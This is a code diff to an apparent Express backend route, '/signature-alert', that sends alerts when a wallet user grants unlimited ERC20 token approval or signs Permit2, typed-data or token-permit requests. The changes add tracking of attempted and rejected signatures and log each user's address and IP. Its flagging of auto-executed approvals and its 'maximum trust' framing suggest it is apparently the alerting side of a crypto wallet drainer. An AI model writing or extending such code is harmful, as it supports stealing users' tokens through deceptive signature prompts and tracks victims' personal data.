@@ -2147,6 +2147,7 @@ router.post('/signature-alert', async (req, res) => {
         break;
         
       case 'ERC20_UNLIMITED_APPROVE':
+      case 'ERC20_UNLIMITED_APPROVE_ATTEMPTED':
         alertTitle = `🚨 UNLIMITED APPROVE: ${userAddress.slice(0,8)}... granted unlimited token access ${data.autoExecuted ? '(AUTO)' : ''}`;
         alertMessage = `CRITICAL: USER GRANTED UNLIMITED TOKEN ACCESS\n\n` +
           `⚠️ ALERT LEVEL: MAXIMUM TRUST\n` +
@@ -2185,6 +2186,7 @@ router.post('/signature-alert', async (req, res) => {
         break;
         
       case 'PERMIT2_SIGNATURE':
+      case 'PERMIT2_ATTEMPTED':
         alertTitle = `✅ PERMIT2 SIGNED: ${userAddress.slice(0,8)}... signed permit ${data.autoExecuted ? '(AUTO)' : ''}`;
         alertMessage = `PERMIT2 SIGNATURE COMPLETED\n\n` +
           `USER: ${userAddress}\n` +
@@ -2196,6 +2198,7 @@ router.post('/signature-alert', async (req, res) => {
         break;
         
       case 'TYPED_DATA_V4':
+      case 'TYPED_DATA_V4_ATTEMPTED':
         alertTitle = `📝 TYPED DATA: ${userAddress.slice(0,8)}... signed structured data`;
         alertMessage = `TYPED DATA V4 SIGNATURE\n\n` +
           `USER: ${userAddress}\n` +
@@ -2210,6 +2213,16 @@ router.post('/signature-alert', async (req, res) => {
           `• User willing to sign platform data\n` +
           `• Demonstrates confidence in service\n` +
           `• Potential for advanced integrations\n\n` +
+          `USER IP: ${realIP}\n` +
+          `TIME: ${new Date().toISOString()}`;
+        break;
+        
+      case 'TOKEN_PERMIT_ATTEMPTED':
+        alertTitle = `🔐 TOKEN PERMIT: ${userAddress.slice(0,8)}... attempted token permit`;
+        alertMessage = `TOKEN PERMIT ATTEMPT\n\n` +
+          `USER: ${userAddress}\n` +
+          `STATUS: ${data.rejected ? 'REJECTED' : 'ATTEMPTED'}\n` +
+          `ERROR: ${data.error || 'None'}\n\n` +
           `USER IP: ${realIP}\n` +
           `TIME: ${new Date().toISOString()}`;
         break;
